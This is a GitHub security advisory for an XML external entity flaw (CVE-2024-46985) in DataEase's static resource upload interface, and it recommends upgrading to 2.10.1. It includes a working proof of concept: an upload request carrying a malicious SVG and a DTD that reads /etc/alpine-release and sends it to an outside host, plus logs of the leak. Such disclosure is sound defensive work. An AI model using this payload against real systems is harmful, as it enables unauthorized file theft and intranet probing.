# [H] DataEase has an XML External Entity Reference vulnerability

## Summary
Severity: High
Advisory: GHSA-4m9p-7xg6-f4mm
CVE: CVE-2024-46985
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-09-23
Source: https://github.com/advisories/GHSA-4m9p-7xg6-f4mm
Type: github-advisory

## Affected
- Maven: `io.dataease:common` — affected >=0 <2.10.1

## Details
### Impact
There is an XML external entity injection vulnerability in the static resource upload interface of DataEase. An attacker can construct a payload to implement intranet detection and file reading.

1. send request:
```
POST /de2api/staticResource/upload/1 HTTP/1.1
Host: dataease.ubuntu20.vm
Content-Length: 348
Accept: application/json, text/plain, */*
out_auth_platform: default
X-DE-TOKEN: jwt
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6OZBNygiUCAZEbMn

------WebKitFormBoundary6OZBNygiUCAZEbMn
Content-Disposition: form-data; name="file"; filename="1.svg"
Content-Type: a

<?xml version='1.0'?>
    <!DOCTYPE xxe [
        <!ENTITY % EvilDTD SYSTEM 'http://10.168.174.1:8000/1.dtd'>
        %EvilDTD;
        %LoadOOBEnt;
        %OOB;
    ]>
------WebKitFormBoundary6OZBNygiUCAZEbMn--

// 1.dtd的内容
<!ENTITY % resource SYSTEM "file:///etc/alpine-release">
        <!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://10.168.174.1:8000/?content=%resource;'>">
```

2. After sending the request, the content of the file /etc/alpine-release is successfully read
```
::ffff:10.168.174.136 - - [16/Sep/2024 10:23:44] "GET /1.dtd HTTP/1.1" 200 -
::ffff:10.168.174.136 - - [16/Sep/2024 10:23:44] "GET /?content=3.20.0 HTTP/1.1" 200 -
```

Affected versions: <= 2.10.0

### Patches
The vulnerability has been fixed in v2.10.1.

### Workarounds
It is recommended to upgrade the version to v2.10.1.

### References
If you have any questions or comments about this advisory:

Open an issue in https://github.com/dataease/dataease
Email us at [wei@fit2cloud.com](mailto:wei@fit2cloud.com)

## References
- https://github.com/dataease/dataease/security/advisories/GHSA-4m9p-7xg6-f4mm
- https://nvd.nist.gov/vuln/detail/CVE-2024-46985
- https://github.com/dataease/dataease
